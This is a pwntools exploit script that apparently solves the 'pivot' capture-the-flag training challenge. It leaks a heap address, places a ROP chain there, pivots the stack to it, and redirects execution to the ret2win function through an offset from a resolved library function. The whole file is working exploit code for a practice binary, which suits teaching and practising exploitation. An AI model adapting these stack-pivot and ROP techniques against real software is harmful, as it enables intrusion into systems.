#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

elf = context.binary = ELF('./pivot')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

context.terminal = ["tilix", "-a", "session-add-right", "-e"]
context.log_level = 'debug'
context.delete_corefiles = True

# -- Exploit goes here --

# at this point I already know the rip offset is gonna be 0x28 bytes
# so I'm just gonna use that
rip_offset = 0x28

# gadgets
pop_rbp_ret = p64(0x4007c8)
pop_rsp_r13x15_ret = p64(0x400a2d)
pop_rax_ret = p64(0x4009bb)
mov_rax_rax_ret = p64(0x4009c0)
add_rax_rbp_ret = p64(0x4009c4)
pop_rbp_mov_edi_jmp_rax = p64(0x4007bb)

foothold_reloc_stub_addr = 0x400720
foothold_resolved_addr = 0x601040

io = start()

io.recvuntil('The Old Gods kindly bestow upon you a place to pivot: ')
heap_addr = int(io.recvuntil('\n'), base=16)
info("heap address = %x", heap_addr)

heap_payload = flat(
    p64(0), # r13
    p64(0), # r14
    p64(0), # r15
    p64(foothold_reloc_stub_addr), # call foothold once to resolve it's address
    pop_rax_ret, # return to our ropchain. Note that foothold_function doesn't repivot the stack
    p64(foothold_resolved_addr),
    mov_rax_rax_ret,
    pop_rbp_ret,
    p64(0xa81 - 0x96a), # offset to add to rax in order to jump to ret2win
    add_rax_rbp_ret,
    pop_rbp_mov_edi_jmp_rax
)

io.sendlineafter('>', heap_payload)

stack_payload = flat(
    asm('nop')*rip_offset,
    pop_rsp_r13x15_ret,
    p64(heap_addr), # new stack
)

io.sendlineafter('>', stack_payload)

io.interactive()

